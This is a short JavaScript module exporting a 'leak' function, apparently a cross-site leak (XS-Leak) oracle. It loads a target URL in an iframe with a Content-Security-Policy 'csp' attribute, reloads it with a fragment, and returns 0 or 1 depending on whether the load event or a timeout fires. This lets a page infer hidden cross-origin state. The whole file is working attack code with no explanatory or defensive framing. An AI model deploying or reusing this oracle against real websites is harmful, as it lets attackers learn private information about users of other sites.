const leak = async(url, csp='default-src \'self\';') => {
    return new Promise((r)=> {
        let i = document.createElement('iframe')
        i.setAttribute('csp', csp)
        i.src = url
        i.onload = () => {
            // overwrite onload 
            i.onload = () => {
                i.remove()
                return r(0)
            }
            i.src = url + '#'
        }
        let t = setTimeout(() => {
            i.remove()
            return r(1)
        }, 2000)
        document.body.append(i)
    })

}


export { leak }